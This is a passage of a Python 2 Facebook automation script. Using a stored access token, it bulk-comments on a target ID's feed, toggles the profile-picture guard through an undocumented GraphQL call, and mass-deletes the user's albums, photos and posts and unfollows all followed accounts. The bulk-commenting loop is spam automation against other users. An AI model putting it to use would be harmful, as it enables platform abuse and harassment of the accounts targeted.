		p = requests.get("https://graph.facebook.com/v3.0/"+yes['id']+"?fields=feed.limit(50)&access_token="+token)
		a = json.loads(p.text)
		jalan('\033[1;97m[✺] \033[1;92mStart \033[1;97m...')
		print 42*"\033[1;97m═"
		for s in a['feed']['data']:
			z = s['id']
			requests.post("https://graph.facebook.com/"+z+"/comments?message="+komen+"&access_token="+token)
			print '\033[1;97m[ \033[1;92m'+komen[:10].replace('\n',' ')+'... \033[1;97m] '+z
			print 42*"\033[1;97m═"
		print "\r\033[1;97m[+]\033[1;92m Done \033[1;97m"
		raw_input("\n\033[1;97m[\033[1;92mBack\033[1;97m]")
		menu()
	except KeyError:
		print"\033[1;97m[!] \033[1;91mId not found"
		raw_input("\n\033[1;97m[\033[1;92mBack\033[1;97m]")
		menu()
		
		
def guard():
	os.system('clear')
	try:
		token = open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"\033[1;97m[!] \033[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print "\033[1;97m╔════════════════════════════════════════"
	print "\033[1;97m║ \033[1;95m[\033[1;97m01\033[1;95m]\033[1;97m. Activate"
	print "\033[1;97m║ \033[1;95m[\033[1;97m02\033[1;95m]\033[1;97m. Non activate"
	print "\033[1;97m║ \033[1;95m[\033[1;91m00\033[1;95m]\033[1;91m. Back"
	print  "\033[1;97m║"
	g = raw_input("\033[1;97m╚═\033[1;95m[\033[1;92mChoose\033[1;95m]\033[1;97m>> ")
	if g == "1" or g =="01":
		aktif = "true"
		gaz(token, aktif)
	elif g == "2" or g =="02":
		non = "false"
		gaz(token, non)
	elif g =="0" or g =="00":
		lain()
	elif g =="":
		keluar()
	else:
		keluar()
	
def get_userid(token):
	url = "https://graph.facebook.com/me?access_token=%s"%token
	res = requests.get(url)
	uid = json.loads(res.text)
	return uid["id"]
		
def gaz(token, enable = True):
	id = get_userid(token)
	data = 'variables={"0":{"is_shielded": %s,"session_id":"9b78191c-84fd-4ab6-b0aa-19b39f04a6bc","actor_id":"%s","client_mutation_id":"b0316dd6-3fd6-4beb-aed4-bb29c5dc64b0"}}&method=post&doc_id=1477043292367183&query_name=IsShieldedSetMutation&strip_defaults=true&strip_nulls=true&locale=en_US&client_country_code=US&fb_api_req_friendly_name=IsShieldedSetMutation&fb_api_caller_class=IsShieldedSetMutation' % (enable, str(id))
	headers = {"Content-Type" : "application/x-www-form-urlencoded", "Authorization" : "OAuth %s" % token}
	url = "https://graph.facebook.com/graphql"
	res = requests.post(url, data = data, headers = headers)
	print(res.text)
	if '"is_shielded":true' in res.text:
		os.system('clear')
		print logo
		print "\033[1;97m═════════════════════════════════════════"
		print"\033[1;97m[\033[1;92m✓\033[1;97m] \033[1;92mActivate"
		raw_input("\n\033[1;97m[\033[1;92mBack\033[1;97m]")
		menu()
	elif '"is_shielded":false' in res.text:
		os.system('clear')
		print logo
		print "\033[1;97m═════════════════════════════════════════"
		print"\033[1;97m[\033[1;92m✓\033[1;97m] \033[1;91mNot activate"
		raw_input("\n\033[1;97m[\033[1;92mBack\033[1;97m]")
		menu()
	else:
		print "\033[1;97m[!] \033[1;91mError"
		keluar()
		
def album():
	os.system('clear')
	try:
		token = open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"\033[1;97m[!] \033[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print "\033[1;97m═════════════════════════════════════════"
	jalan('\033[1;97m[✺] \033[1;92mGetting id \033[1;97m...')
	print '\033[1;97m[✺] \033[1;92mStart \033[1;97m...'
	print "\033[1;97m═════════════════════════════════════════"
	r = requests.get("https://graph.facebook.com/v2.3/me/albums?access_token="+token)
	z = json.loads(r.text)
	for s in z['data']:
		idp = s['id']
		p = requests.post("https://graph.facebook.com/"+idp+"?method=delete&access_token="+token)
		s = json.loads(p.text)
		try:
			cek = s['error']['message']
			print "\033[1;97m[×] \033[1;91mFailed"
		except TypeError:
			print "\033[1;97m[ \033[1;92mDeleted\033[1;97m ] ==> "+idp
		except requests.exceptions.ConnectionError:
			print"\033[1;97m[!] \x1b[1;91mNo connection"
			keluar()
	print "\033[1;97m═════════════════════════════════════════"
	print"\033[1;97m[+] \033[1;92mDone \033[1;97m"
	print "\033[1;97m═════════════════════════════════════════"
	raw_input("\n\033[1;97m[\033[1;92mBack\033[1;97m]")
	menu()
		
def unfollow():
	os.system('clear')
	try:
		token = open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"\033[1;97m[!] \033[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print "\033[1;97m═════════════════════════════════════════"
	jalan('\033[1;97m[✺] \033[1;92mGetting id \033[1;97m...')
	print '\033[1;97m[✺] \033[1;92mStart \033[1;97m...'
	print "\033[1;97m═════════════════════════════════════════"
	r = requests.get("https://graph.facebook.com/me/subscribedto?limit=5000&access_token="+token)
	z = json.loads(r.text)
	for s in z['data']:
		unf = s['id']
		nama = s['name']
		p = requests.post("https://graph.facebook.com/"+unf+"/subscribers?method=delete&access_token="+token)
		s = json.loads(p.text)
		try:
			cek = s['error']['message']
			print "\033[1;97m[×] \033[1;91mFailed"
		except TypeError:
			print "\033[1;97m[ \033[1;92mUnfollow\033[1;97m ] ==> "+nama
		except requests.exceptions.ConnectionError:
			print"\033[1;97m[!] \x1b[1;91mNo connection"
			keluar()
	print "\033[1;97m═════════════════════════════════════════"
	print"\033[1;97m[+] \033[1;92mDone \033[1;97m"
	print "\033[1;97m═════════════════════════════════════════"
	raw_input("\n\033[1;97m[\033[1;92mBack\033[1;97m]")
	menu()
	
def deletephoto():
	os.system('clear')
	try:
		token = open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"\033[1;97m[!] \033[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print "\033[1;97m═════════════════════════════════════════"
	album = raw_input("\033[1;97m[+] \033[1;92mInput id album \033[1;91m: \033[1;97m")
	jalan('\033[1;97m[✺] \033[1;92mGetting all photo id \033[1;97m...')
	print '\033[1;97m[✺] \033[1;92mStart \033[1;97m...'
	print "\033[1;97m═════════════════════════════════════════"
	try:
		gas = requests.get("https://graph.facebook.com/"+album+"/photos?access_token="+token)
		ok = json.loads(gas.text)
		for e in ok['data']:
			id = e['id']
			y = requests.post("https://graph.facebook.com/"+e['id']+"?method=DELETE&access_token="+token)
			o = json.loads(y.text)
			try:
				cek = o['error']['message']
				print "\033[1;97m[×] \033[1;91mFailed"
			except TypeError:
				print "\033[1;97m[ \033[1;92mDeleted\033[1;97m ] ==> "+id
		print "\033[1;97m═════════════════════════════════════════"
		print"\033[1;97m[+] \033[1;92mDone \033[1;97m"
		print "\033[1;97m═════════════════════════════════════════"
		raw_input("\n\033[1;97m[\033[1;92mBack\033[1;97m]")
		menu()
	except KeyError:
		print"\033[1;97m[!] \x1b[1;91mId not found"
		raw_input("\n\033[1;97m[\033[1;92mBack\033[1;97m]")
		menu()
	except requests.exceptions.ConnectionError:
		print"\033[1;97m[!] \x1b[1;91mNo connection"
		keluar()
		
def deletepost():
	os.system('clear')
	try:
		token = open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"\033[1;97m[!] \033[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print "\033[1;97m═════════════════════════════════════════"
	jalan('\033[1;97m[✺] \033[1;92mGetting all post id \033[1;97m...')
	print '\033[1;97m[✺] \033[1;92mStart \033[1;97m...'
	print "\033[1;97m═════════════════════════════════════════"
	try:
		gas = requests.get("https://graph.facebook.com/me/posts?access_token="+token)
		ok = json.loads(gas.text)
		for e in ok['data']:
			id = e['id']
			y = requests.post("https://graph.facebook.com/"+id+"?method=DELETE&access_token="+token)
			o = json.loads(y.text)
			try:
				cek = o['error']['message']
				print "\033[1;97m[×] \033[1;91mFailed"
			except TypeError:
				print "\033[1;97m[ \033[1;92mDeleted\033[1;97m ] ==> "+id
		print "\033[1;97m═════════════════════════════════════════"
		print"\033[1;97m[+] \033[1;92mDone \033[1;97m"
		print "\033[1;97m═════════════════════════════════════════"
		raw_input("\n\033[1;97m[\033[1;92mBack\033[1;97m]")
		menu()
	except KeyError:
		print"\033[1;97m[!] \x1b[1;91mId not found"
		raw_input("\n\033[1;97m[\033[1;92mBack\033[1;97m]")
		menu()
	except requests.exceptions.ConnectionError:
		print"\033[1;97m[!] \x1b[1;91mNo connection"
		keluar()
	
if __name__ == '__main__':
	login()
